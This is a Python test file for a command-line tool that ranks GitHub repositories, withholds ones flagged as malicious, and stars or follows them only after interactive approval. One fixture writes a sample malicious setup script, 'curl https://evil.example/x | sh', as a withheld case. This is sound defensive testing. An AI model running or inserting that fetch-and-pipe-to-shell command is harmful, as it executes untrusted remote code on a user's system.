"""The CLI keeps its offline fixture path and its fail-closed exit status honest."""

from __future__ import annotations

import io
import json
from pathlib import Path

from gitseed import cli
from gitseed.cli import main
from gitseed.grade.types import GradeResult


FIXTURES = Path(__file__).parent / "fixtures"


def _write_fixture(root: Path, *, complete: bool = True) -> None:
    """Create the smallest replayable repository set for a CLI boundary test."""
    root.mkdir(exist_ok=True)
    (root / "clean").mkdir()
    (root / "malicious").mkdir()
    (root / "clean" / "main.py").write_text("def add(a, b):\n    return a + b\n")
    (root / "malicious" / "setup.sh").write_text("curl https://evil.example/x | sh\n")
    (root / "candidates.json").write_text(
        json.dumps(
            {
                "complete": complete,
                "stopped_because": "fixture rate limit" if not complete else None,
                "candidates": [
                    {
                        "full_name": "fixture/clean",
                        "html_url": "https://github.com/fixture/clean",
                        "stargazers_count": 8,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "clean",
                    },
                    {
                        "full_name": "fixture/malicious",
                        "html_url": "https://github.com/fixture/malicious",
                        "stargazers_count": 1,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "malicious",
                    },
                ],
            }
        )
    )
    (root / "grades.json").write_text(
        json.dumps(
            {
                "fixture/clean": {
                    "idea": 8,
                    "skill": 7,
                    "description": "small utility",
                    "model": "fixture",
                    "temperature": 0.0,
                    "prompt_version": "fixture-v1",
                }
            }
        )
    )


def test_run_over_fixtures_prints_a_ranked_table(capsys) -> None:
    # Given: the checked-in fixture replay has one clean and one withheld repository.
    # When: an operator runs the default dry-run path.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    # Then: both records remain visible in rank order.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "fixture/clean" in captured.out
    assert "fixture/malicious" in captured.out
    assert "withheld" in captured.out


def test_an_incomplete_collection_exits_two_after_printing_the_ranking(tmp_path, capsys) -> None:
    # Given: collection retained candidates before reporting its limit.
    _write_fixture(tmp_path, complete=False)
    # When: the pipeline runs against the replay.
    exit_code = main(["run", "--query", "example", "--fixtures", str(tmp_path)])
    # Then: the usable ranking stays visible but cannot be mistaken for a complete result.
    captured = capsys.readouterr()
    assert exit_code == 2
    assert "fixture/clean" in captured.out
    assert "fixture rate limit" in captured.err


class _NoWriteTransport:
    """A test double that fails if dry-run reaches an external action."""

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        return 200, {"X-RateLimit-Remaining": "1"}, json.dumps(
            {"items": [{"full_name": "fixture/clean", "html_url": "https://github.com/fixture/clean"}]}
        ).encode()

    def star(self, repo: str) -> None:
        raise AssertionError(f"unexpected star: {repo}")

    def unstar(self, repo: str) -> None:
        raise AssertionError(f"unexpected unstar: {repo}")

    def follow(self, user: str) -> None:
        raise AssertionError(f"unexpected follow: {user}")

    def unfollow(self, user: str) -> None:
        raise AssertionError(f"unexpected unfollow: {user}")


class _Grader:
    def evaluate(self, digest: str) -> GradeResult:
        return GradeResult(idea=7, skill=6, description="d", model="test", temperature=0.0, prompt_version="v1")

    def flags_malicious(self, digest: str) -> bool:
        return False


def test_dry_run_never_asks_for_approval_or_constructs_a_live_transport(capsys) -> None:
    # Given: all live seams raise if the dry-run path touches them.
    transport = _NoWriteTransport()
    # When: a caller injects offline seams and leaves dry-run enabled.
    exit_code = main(
        ["run", "--query", "example"],
        transport=transport,
        fetch_files=lambda _: [("main.py", "x = 1\n")],
        grader=_Grader(),
        writer=transport,
        stdin=io.StringIO("s\n"),
    )
    # Then: no approval prompt or writer call occurs.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "[s]tar" not in captured.out


def test_fixture_dry_run_never_constructs_the_live_transport(monkeypatch, capsys) -> None:
    def forbidden_transport(*args, **kwargs):
        raise AssertionError("fixture replay constructed a live transport")

    monkeypatch.setattr(cli, "UrllibTransport", forbidden_transport)
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    assert exit_code == 0
    assert "fixture/clean" in capsys.readouterr().out


def test_json_includes_every_candidate_and_its_withheld_reason(capsys) -> None:
    # Given: fixture output contains both a graded and blocked candidate.
    # When: JSON rendering is selected.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES), "--json"])
    # Then: callers can distinguish a missing score from an omitted record.
    records = json.loads(capsys.readouterr().out)
    assert exit_code == 0
    assert [record["repo"] for record in records] == ["fixture/clean", "fixture/malicious"]
    assert records[1]["withheld"]


def test_bulk_approval_refuses_non_interactive_stdin(tmp_path, capsys) -> None:
    # Given: a complete offline run but no terminal for a human decision.
    _write_fixture(tmp_path)
    # When: bulk approval is requested after deliberately disabling dry-run.
    exit_code = main(
        ["run", "--query", "example", "--fixtures", str(tmp_path), "--no-dry-run", "--approve-all"],
        stdin=io.StringIO("s\n"),
    )
    # Then: piping consent cannot authorize actions.
    captured = capsys.readouterr()
    assert exit_code != 0
    assert "터미널" in captured.err
